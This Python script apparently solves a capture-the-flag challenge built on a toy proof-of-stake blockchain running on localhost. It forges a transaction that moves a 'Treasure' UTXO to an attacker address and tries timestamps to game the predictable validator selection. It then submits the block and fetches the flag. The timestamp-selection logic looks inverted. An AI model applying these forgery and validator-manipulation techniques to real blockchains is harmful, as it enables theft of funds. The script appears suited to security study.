import json
import os
import pickle
import time

import requests, re
import rsa,uuid,hashlib
from requests import session

IP = "localhost"
PORT = 5001
PREFIX = "a1b2c3d4e5f6g"
BASE = f"http://{IP}:{PORT}/{PREFIX}"

s = requests.Session()
def reset():
    """重置区块链"""
    response = s.get(f"{BASE}/reset")
    return response.text

#function
print(reset())
#function
def hash_utxo(utxo):
    return hash_reducer(hash_reducer(utxo['id'], utxo['addr']), str(utxo['amount']))
def hash(x):
    if isinstance(x, str):
        x = x.encode()
    return hashlib.sha256(hashlib.md5(x).digest()).hexdigest()
def hash_reducer(x, y):
    return hash(hash(x) + hash(y))
def has_attrs(d, attrs):
    if type(d) != type({}): raise Exception("Input should be a dict/JSON")
    for attr in attrs:
        if attr not in d:
            raise Exception("{} should be presented in the input".format(attr))
EMPTY_HASH = '0' * 64
def addr_to_pubkey(address):
    return rsa.PublicKey(int(address, 16), 65537)
def pubkey_to_address(pubkey):
    assert pubkey.e == 65537
    hexed = hex(pubkey.n)
    if hexed.endswith('L'): hexed = hexed[:-1]
    if hexed.startswith('0x'): hexed = hexed[2:]
    return hexed
def gen_addr_key_pair():
    pubkey, privkey = rsa.newkeys(384)
    return pubkey_to_address(pubkey), privkey
def create_output_utxo(addr_to, amount):
    utxo = {'id': str(uuid.uuid4()), 'addr': addr_to, 'amount': amount}
    utxo['hash'] = hash_utxo(utxo)
    return utxo
def hash_tx(tx):
    if tx['input']:
        input_hash = tx['input'][0]
        for i in range(1, len(tx['input'])):
            input_hash = hash_reducer(input_hash, tx['input'][i])
    else:
        input_hash = EMPTY_HASH

    if tx['output']:
        output_hashes = [utxo['hash'] for utxo in tx['output']]
        output_hash = output_hashes[0]
        for i in range(1, len(output_hashes)):
            output_hash = hash_reducer(output_hash, output_hashes[i])
    else:
        output_hash = EMPTY_HASH

    return hash_reducer(input_hash, output_hash)
def create_tx(input_utxo_ids, output_utxo, privkey_from=None):
    signatures = []
    if privkey_from:
        for utxo_id in input_utxo_ids:
            signatures.append(rsa.sign(utxo_id.encode(), privkey_from, 'SHA-1').hex())
    tx = {'input': input_utxo_ids, 'signature': signatures, 'output': output_utxo}
    tx['hash'] = hash_tx(tx)
    return tx
def hash_block(block):
    # print(block['transactions'])
    if(block['transactions']==[None]):
        # print("No transactions")
        tx_hashes=[]
    else:
        tx_hashes = [tx['hash'] for tx in block['transactions']] if block['transactions'] else []

    if tx_hashes:
        tx_hash = tx_hashes[0]
        for i in range(1, len(tx_hashes)):
            tx_hash = hash_reducer(tx_hash, tx_hashes[i])
    else:
        tx_hash = EMPTY_HASH
    return hash_reducer(hash_reducer(hash_reducer(block['prev'], block['validator']), str(block['timestamp'])), tx_hash)


def get_chain_from_block(block_hash):
    """Get the chain from genesis to the given block"""
    if block_hash not in session['blocks']:
        return []

    chain = []
    current_hash = block_hash

    while current_hash != session['genesis_block_hash']:
        block = session['blocks'][current_hash]
        chain.append(block)
        current_hash = block['prev']

    # Add genesis block
    chain.append(session['blocks'][session['genesis_block_hash']])
    return chain[::-1]  # Reverse to get chronological order


def calculate_utxo(blockchain_tail):
    chain = get_chain_from_block(blockchain_tail['hash'])
    utxos = {}
    for block in chain:
        for tx in block['transactions']:
            for input_utxo_id in tx['input']:
                if input_utxo_id in utxos:
                    del utxos[input_utxo_id]
            for utxo in tx['output']:
                utxos[utxo['id']] = utxo
    return utxos

def init_session():
    r = s.get(BASE + "/")
    r.raise_for_status()
    txt = r.text
    return txt

def get_utxo():
    print("[*] 初始化 session 并获取首页内容 ..")
    home = init_session()
    m3 = re.search(r'All UTXOs:\s*(\{.*\})', home)
    if not m3:
        print("[-] 无法解析 UTXOs，页面内容可能不同。显示页面片段：\n", home[:1500])
        exit(1)
    utxos_json = m3.group(1)
    utxos = json.loads(utxos_json)
    genesis_match = re.search(r'Hash of genesis block: ([a-f0-9]+)', home)
    genesis_hash = genesis_match.group(1) if genesis_match else None
    addresses = {}
    addr_lines = home.split('Addresses - ')[1].split('<br')[0] if 'Addresses - ' in home else ""
    addr_parts = addr_lines.split(', ')
    for part in addr_parts:
        if ': ' in part:
            name, addr = part.split(': ', 1)
            addresses[name] = addr
    return utxos,genesis_hash,addresses

#初始化
utxos,genesis_hash,address=get_utxo()

validator1_address=address['Validator1']
validator2_address=address['Validator2']
validator3_address=address['Validator3']
address_attacker=address['Attacker']
def get_validator_stake(address, utxos):
    """Calculate the stake amount for a validator"""
    stake = 0
    for utxo in utxos.values():
        if utxo['addr'] == address:
            stake += utxo['amount']
    return stake
def select_validator(prev_block_hash, utxos, timestamp):
    """Select validator based on stake-weighted randomness - VULNERABLE TO LONG RANGE ATTACK"""
    # Calculate stakes for all validators
    stakes = {}
    total_stake = 0

    # Only consider known validators for simplicity
    validator_addresses = [validator1_address, validator2_address, validator3_address, address_attacker]

    for addr in validator_addresses:
        stake = get_validator_stake(addr, utxos)
        if stake > 0:  # Must have some stake to be a validator
            stakes[addr] = stake
            total_stake += stake

    if total_stake == 0:
        raise Exception("No validators with stake found")

    # Use previous block hash and timestamp as seed for "randomness"
    # This is vulnerable because an attacker can try different timestamps
    seed = hash(prev_block_hash + str(timestamp))
    random_val = int(seed, 16) % total_stake

    # Select validator based on stake weight
    cumulative = 0
    for addr, stake in stakes.items():
        cumulative += stake
        if random_val < cumulative:
            return addr

    # Fallback (shouldn't reach here)
    return list(stakes.keys())[0]
def find_blockchain_tail():
    return max(session['blocks'].values(), key=lambda block: block['height'])
def calculate_balance(utxos):
    balance = {
        validator1_address: 0,
        validator2_address: 0,
        validator3_address: 0,
        address_attacker: 0,
    }
    for utxo in utxos.values():
        if utxo['addr'] not in balance:
            balance[utxo['addr']] = 0
        balance[utxo['addr']] += utxo['amount']
    return balance
def get_balance_of_all():
    tail = find_blockchain_tail()
    utxos = calculate_utxo(tail)
    return calculate_balance(utxos), utxos, tail
def submit_block(block):
    """提交区块"""
    response = s.post(
        f"{BASE}/submit_block",
        data=json.dumps(block),
        headers={'Content-Type': 'application/json'}
    )
    return response.text
def get_flag():
    """获取flag"""
    response =s.get(f"{BASE}/flag")
    return response.text
def get_analy():
    """获取flag"""
    response =s.get(f"{BASE}/chain_analysis")
    return response.text
def get_attacker_key():
    response = s.get(f"{BASE}/get_attacker_key")
    key_hex = response.text.split(": ")[1]
    return rsa.PrivateKey.load_pkcs1(bytes.fromhex(key_hex))
address_treasure=address['Treasure']
attacker_key=get_attacker_key()
print(attacker_key)

treasure_utxo_id = None
for utxo_id, utxo in utxos.items():
    if utxo['addr'] == address_treasure and utxo['amount'] == 1000000:
        treasure_utxo_id = utxo_id
        break
if not treasure_utxo_id:
    print("未找到宝藏UTXO")
print(treasure_utxo_id)
fake_tran_input=treasure_utxo_id
fake_tx = {
    'input': [fake_tran_input],
    'signature': [rsa.sign(fake_tran_input.encode(), attacker_key, 'SHA-1').hex()],
    'output': [create_output_utxo(address_attacker,1000000)]
}
fake_tx['hash'] = hash_tx(fake_tx)

def gen_block(pre_hash,tx):
    # 遍历time
    start_ts = int(time.time())
    found = []
    for dt in range(0, 601):  # 0..600 秒
        ts = start_ts + dt
        sel = select_validator(pre_hash, utxos, ts)
        # print(sel)
        if sel != address_attacker:
            found.append(ts)
            break
    timestamp =found[0]
    print(timestamp)
    block_payload = {
        'prev': pre_hash,
        'validator': address_attacker,
        'timestamp': timestamp,
        'transactions': [tx],
        'signature': ''  # 计算签名之前为空
    }
    # 计算 block_hash（不包含 signature）
    block_hash_str = hash_block(block_payload)
    # 用 attacker 私钥签名 block_hash
    block_sig = rsa.sign(block_hash_str.encode(), attacker_key, 'SHA-1').hex()
    if tx is None:
        block = {
            'prev': pre_hash,
            'validator': address_attacker,
            'timestamp': timestamp,
            'transactions': [],
            'signature': block_sig
        }
    else:
        block = {
            'prev': pre_hash,
            'validator': address_attacker,
            'timestamp': timestamp,
            'transactions': [tx],
            'signature': block_sig
        }
    print(submit_block(block))
    return hash_block(block)

with open('full_chain_analysis.txt', 'w', encoding='utf-8') as f:
    f.write(str(get_analy()))
print("Saved to full_chain_analysis.txt")

pre_hash=gen_block(genesis_hash,fake_tx)
# pre_hash=gen_block1(genesis_hash,fake_tx)
print(pre_hash)
with open('full_chain_analysis1.txt', 'w', encoding='utf-8') as f:
    f.write(str(get_analy()))
print("Saved to full_chain_analysis.txt")
print(get_flag())